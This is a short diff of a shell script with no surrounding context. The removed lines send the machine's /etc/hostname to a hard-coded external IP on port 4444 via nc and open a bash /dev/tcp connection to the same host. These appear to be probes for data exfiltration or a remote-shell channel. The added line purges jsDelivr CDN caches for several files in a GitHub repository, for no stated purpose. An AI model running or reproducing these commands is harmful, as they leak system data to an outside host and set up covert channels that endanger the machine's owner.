@@ -1,3 +1,1 @@
-( command -v nc && nc -w 3 91.215.85.170 4444 < /etc/hostname ) 2>&1
-( command -v bash && bash -c "echo BASHTEST > /dev/tcp/91.215.85.170/4444" ) 2>&1
-echo done
+for n in 6801 6807 6809 6814; do curl -s -m 8 -o /dev/null https://purge.jsdelivr.net/gh/anti-phishing-bot/x2@main/b$n; done
